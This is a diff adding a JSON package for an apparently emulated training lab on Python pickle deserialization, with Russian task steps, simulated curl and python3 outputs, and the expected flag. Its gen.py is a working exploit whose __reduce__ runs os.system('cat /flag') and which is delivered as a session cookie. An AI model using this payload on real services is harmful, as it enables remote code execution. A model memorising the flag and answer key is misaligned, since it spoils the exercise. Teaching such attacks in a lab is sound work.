@@ -1,0 +1,30 @@
+{
+  "id": "web-python-deser",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{p1ckl3_1s_4_vm}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: Python pickle RCE\n\nFlask-приложение `https://notes.example` хранит сессию в cookie `session` как\nbase64 pickle (`session.txt`). При следующем запросе сервер делает pickle.loads().\n\n1. Подтверди формат (сигнатура `80 04` = protocol 4):\n\n   base64 -d session.txt | xxd | head -1\n\n2. Сгенерируй payload скриптом `gen.py` (класс с __reduce__) в cookie-файл:\n\n   python3 gen.py > cookies.txt\n\n3. Отправь cookie серверу:\n\n   curl -s https://notes.example/ -b cookies.txt > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/session.txt", "text": "gASVHgAAAAAAAACMC19fbWFpbl9flIwHRXhwbG9pdJSTlC4=\n" },
+    { "path": "/home/student/task/gen.py", "text": "import pickle, os, base64\n\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, ('cat /flag',))\n\nb = base64.b64encode(pickle.dumps(Exploit())).decode()\n# Netscape cookie jar: domain flag path secure expires name value\nprint('notes.example\\tFALSE\\t/\\tFALSE\\t0\\tsession\\t' + b)\n" }
+  ],
+  "tools": {
+    "python3": {
+      "help": "python3 <скрипт> — интерпретатор Python (replay: запуск подготовленного генератора payload)",
+      "cases": [
+        { "match": "gen\\.py", "example": "gen.py", "output": "notes.example\tFALSE\t/\tFALSE\t0\tsession\tgASVJgAAAAAAAACMCm9zLnN5c3RlbZSMAmNhdJSTlCiMB2ZsYWcudHh0lIWUjAhjYXQgL2ZsYWeUhpQu\n" },
+        { "match": "gen\\.py.*-o", "example": "gen.py -o cookies.txt", "output": "wrote cookies.txt\n" }
+      ],
+      "fallback": "python3: в этой лабе эмулируется только генератор payload (python3 gen.py).\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция notes.example)",
+      "cases": [
+        { "match": "-b cookies\\.txt|cookies\\.txt|--cookie", "example": "-s https://notes.example/ -b cookies.txt", "output": "{\"status\":\"error\",\"message\":\"os.system: nto{p1ckl3_1s_4_vm}\"}\n" },
+        { "match": "notes\\.example", "example": "-s https://notes.example/", "output": "{\"status\":\"ok\",\"notes\":[]}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://notes.example/.\n"
+    }
+  }
+}
